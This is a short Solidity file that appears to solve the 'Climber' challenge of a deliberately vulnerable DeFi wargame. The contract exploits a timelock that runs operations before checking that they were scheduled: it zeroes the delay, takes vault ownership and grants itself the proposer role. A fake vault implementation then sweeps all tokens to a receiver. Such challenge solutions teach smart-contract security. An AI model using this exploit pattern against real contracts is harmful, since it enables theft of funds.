// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";

contract AttackC {
  ClimberVault vault;
  ClimberTimelock timeLock;
  address player;
  address DVT;
  address[] public targets = new address[](4);
  uint256[] public values = new uint256[](4);
  bytes[] public dataElements = new bytes[](4);
  bytes32 public salt = 0x0;

  constructor (address _vault, address payable _timeLock, address _player, address _DVT) {
    vault = ClimberVault(_vault);
    timeLock = ClimberTimelock(_timeLock);
    player = _player;
    DVT = _DVT;
  }

  function kek() public {
    targets[0] = address(timeLock);
    targets[1] = address(vault);
    targets[2] = address(timeLock);
    targets[3] = address(this);
    dataElements[0] = abi.encodeWithSelector(timeLock.updateDelay.selector,0);
    dataElements[1] = abi.encodeWithSelector(vault.transferOwnership.selector,player);
    dataElements[2] = abi.encodeWithSelector(timeLock.grantRole.selector,PROPOSER_ROLE,address(this));
    dataElements[3] = abi.encodeWithSelector(AttackC.kekSchedule.selector);
    timeLock.execute(targets,values,dataElements,salt);
  }

  function kekSchedule() external {
    timeLock.schedule(targets,values,dataElements,salt);
  }
}

contract FakeImplementation is ClimberVault {  
  function kekSweep(address token, address receiver) public {
    SafeTransferLib.safeTransfer(token, receiver, IERC20(token).balanceOf(address(this)));
  }
}
